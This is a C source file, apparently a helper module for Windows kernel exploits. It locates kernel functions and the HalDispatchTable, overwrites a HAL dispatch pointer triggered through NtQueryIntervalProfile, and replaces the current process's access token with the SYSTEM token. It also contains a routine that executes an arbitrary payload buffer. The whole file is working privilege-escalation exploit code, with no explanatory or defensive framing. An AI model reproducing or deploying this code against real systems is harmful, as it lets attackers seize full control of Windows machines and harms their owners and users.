#include <stdio.h>
#include "windefs.h"
#include "kernel.h"
#include <Psapi.h>

#define SYSTEM_PID 4
#define DRIVER_COUNT 1024

typedef NTSTATUS(NTAPI*PLOOKUPPROCESSBYID)(HANDLE processId, PVOID process);
typedef PACCESS_TOKEN(NTAPI*PREFPRIMARYTOKEN)(PVOID process);
typedef NTSTATUS(WINAPI*PNTQUERYSYSTEMINFORMATION)(SYSTEM_INFORMATION_CLASS sysInfoClass, PVOID sysInfo, ULONG sysInfoLength, PULONG returnLength);
typedef NTSTATUS(WINAPI*PNTQUERYINTERVALPROFILE)(DWORD profileSource, PULONG interval);

static ULONG_PTR g_pHalDispatch = 0L;
static PLOOKUPPROCESSBYID g_pLookupProcessById = NULL;
static PREFPRIMARYTOKEN g_pRefPrimaryToken = NULL;
static DWORD g_currentPid = 0;
static DWORD g_replaced = FALSE;

static NTSTATUS WINAPI NtQueryIntervalProfile(DWORD profileSource, PULONG interval)
{
	static PNTQUERYINTERVALPROFILE pNtQueryIntervalProfile = NULL;

	if (pNtQueryIntervalProfile == NULL)
	{
		pNtQueryIntervalProfile = (PNTQUERYINTERVALPROFILE)GetProcAddress(GetModuleHandle(TEXT("ntdll")), "NtQueryIntervalProfile");
	}

	return pNtQueryIntervalProfile(profileSource, interval);
}

static NTSTATUS WINAPI NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS sysInfoClass, PVOID sysInfo, ULONG sysInfoLength, PULONG returnLength)
{
	static PNTQUERYSYSTEMINFORMATION pNtQuerySystemInformation = NULL;

	if (pNtQuerySystemInformation == NULL)
	{
		pNtQuerySystemInformation = (PNTQUERYSYSTEMINFORMATION)GetProcAddress(GetModuleHandle(TEXT("ntdll")), "NtQuerySystemInformation");
	}

	return pNtQuerySystemInformation(sysInfoClass, sysInfo, sysInfoLength, returnLength);
}

static PVOID get_system_info(SYSTEM_INFORMATION_CLASS infoClass)
{
	ULONG size = 0x100;
	const ULONG maxSize = size << 10;
	PVOID buffer = NULL;
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
	ULONG memIO = 0;
	
	while (status == STATUS_INFO_LENGTH_MISMATCH && maxSize > size)
	{
		buffer = buffer == NULL ? HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size) : HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buffer, size);
		status = NtQuerySystemInformation(infoClass, buffer, size, &memIO);
		size = size << 1;
	}

	if (NT_SUCCESS(status))
	{
		return buffer;
	}

	if (buffer != NULL)
	{
		HeapFree(GetProcessHeap(), 0, buffer);
	}

	return NULL;
}

static VOID find_and_replace_member(PDWORD_PTR pStruct, DWORD_PTR currentValue, DWORD_PTR newValue, DWORD_PTR maxSize)
{
	DWORD_PTR mask = ~(sizeof(DWORD_PTR) == sizeof(DWORD) ? 7 : 0xf);
	g_replaced = FALSE;

	for (DWORD_PTR i = 0; i < maxSize; ++i)
	{
		if (((pStruct[i] ^ currentValue) & mask) == 0)
		{
			pStruct[i] = newValue;
			g_replaced = TRUE;
			return;
		}
	}
}

BOOL is_driver_loaded(wchar_t* driverName)
{
	// start by finding out how big the buffer size needs to be:
	LPVOID derp = 0;
	DWORD sizeNeeded = 0;
	BOOL result = FALSE;

	// determine the size required first
	EnumDeviceDrivers(&derp, sizeof(derp), &sizeNeeded);

	LPVOID* driverList = (LPVOID*)malloc(sizeNeeded);

	if (EnumDeviceDrivers(driverList, sizeNeeded, &sizeNeeded))
	{
		wchar_t driver[MAX_PATH];
		DWORD driverCount = sizeNeeded / sizeof(LPVOID);

		for (DWORD i = 0; i < driverCount; ++i)
		{
			if (GetDeviceDriverBaseNameW(driverList[i], driver, MAX_PATH)
				&& _wcsicmp(driver, driverName) == 0)
			{
				result = TRUE;
				break;
			}
		}
	}

	free(driverList);

	return result;
}

// Simple wrapper over the steal_process_token that takes the four arguments used by the function we
// overwrite in the HAL dispatch
VOID hal_dispatch_steal_process_token(DWORD_PTR arg1, DWORD_PTR arg2, DWORD_PTR arg3, DWORD_PTR arg4)
{
	steal_process_token();
}

VOID steal_process_token()
{
	LPVOID currentProcessInfo = NULL;
	LPVOID systemProcessInfo = NULL;

	g_pLookupProcessById((HANDLE)g_currentPid, &currentProcessInfo);
	g_pLookupProcessById((HANDLE)SYSTEM_PID, &systemProcessInfo);

	PACCESS_TOKEN targetToken = g_pRefPrimaryToken(currentProcessInfo);
	PACCESS_TOKEN systemToken = g_pRefPrimaryToken(systemProcessInfo);

	find_and_replace_member((PDWORD_PTR)currentProcessInfo, (DWORD_PTR)targetToken, (DWORD_PTR)systemToken, 0x200);
}

BOOL prepare_for_kernel()
{
	BOOL result = FALSE;
	PRTL_PROCESS_MODULES procModules = NULL;
	CHAR fullKernelPath[MAX_PATH * 2 + 1] = { 0 };
	PVOID mappedKernel = NULL;

	do
	{
		procModules = get_system_info(SystemModuleInformation);
		if (procModules == NULL || procModules->NumberOfModules == 0)
		{
			break;
		}

		UINT length = GetSystemDirectoryA(fullKernelPath, MAX_PATH);
		fullKernelPath[length] = '\\';

		const char* firstModule = (const char*)&procModules->Modules[0].FullPathName[procModules->Modules[0].OffsetToFileName];
		strcat_s(fullKernelPath, MAX_PATH, firstModule);

		ULONG_PTR kernelBase = (ULONG_PTR)procModules->Modules[0].ImageBase;
		mappedKernel = LoadLibraryExA(fullKernelPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
		if (mappedKernel == NULL)
		{
			break;
		}

		ULONG_PTR funcAddr = (ULONG_PTR)GetProcAddress(mappedKernel, "PsLookupProcessByProcessId");

		if (funcAddr == 0L)
		{
			break;
		}

		g_pLookupProcessById = (PLOOKUPPROCESSBYID)(kernelBase + funcAddr - (ULONG_PTR)mappedKernel);

		funcAddr = (ULONG_PTR)GetProcAddress(mappedKernel, "PsReferencePrimaryToken");

		if (funcAddr == 0L)
		{
			break;
		}

		g_pRefPrimaryToken = (PREFPRIMARYTOKEN)(kernelBase + funcAddr - (ULONG_PTR)mappedKernel);

		funcAddr = (ULONG_PTR)GetProcAddress(mappedKernel, "HalDispatchTable");

		if (funcAddr != 0L)
		{
			g_pHalDispatch = kernelBase + funcAddr - (ULONG_PTR)mappedKernel;
		}

		g_currentPid = GetCurrentProcessId();

		result = TRUE;
	} while (0);

	if (mappedKernel != NULL)
	{
		FreeLibrary(mappedKernel);
	}

	if (procModules != NULL)
	{
		HeapFree(GetProcessHeap(), 0, procModules);
	}

	return result;
}

BOOL was_token_replaced()
{
	return g_replaced;
}

ULONG_PTR get_hal_dispatch_pointer()
{
	return g_pHalDispatch + sizeof(ULONG_PTR);
}

VOID invoke_hal_dispatch_pointer()
{
	ULONG ignored;
	NtQueryIntervalProfile(1234, &ignored);
}

DWORD get_page_size()
{
	static DWORD pageSize = 0;
	if (pageSize == 0)
	{
		SYSTEM_INFO si;
		GetSystemInfo(&si);
		pageSize = si.dwPageSize;
	}
	return pageSize;
}

BOOL create_anon_mapping(MemMapping* memMap)
{
	memMap->mapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, get_page_size(), NULL);
	if (memMap->mapping == NULL)
	{
		return FALSE;
	}

	memMap->buffer = (LPBYTE)MapViewOfFile(memMap->mapping, FILE_MAP_ALL_ACCESS, 0, 0, get_page_size());
	if (memMap->buffer == NULL)
	{
		destroy_anon_mapping(memMap);
		return FALSE;
	}

	return TRUE;
}

VOID destroy_anon_mapping(MemMapping* memMap)
{
	if (memMap != NULL)
	{
		if (memMap->buffer)
		{
			UnmapViewOfFile(memMap->buffer);
			memMap->buffer = NULL;
		}
		if (memMap->mapping != NULL)
		{
			CloseHandle(memMap->mapping);
			memMap->mapping = NULL;
		}
	}
}

DWORD execute_payload(LPVOID lpPayload)
{
	VOID(*lpCode)() = (VOID(*)())lpPayload;
	lpCode();
	return ERROR_SUCCESS;
}
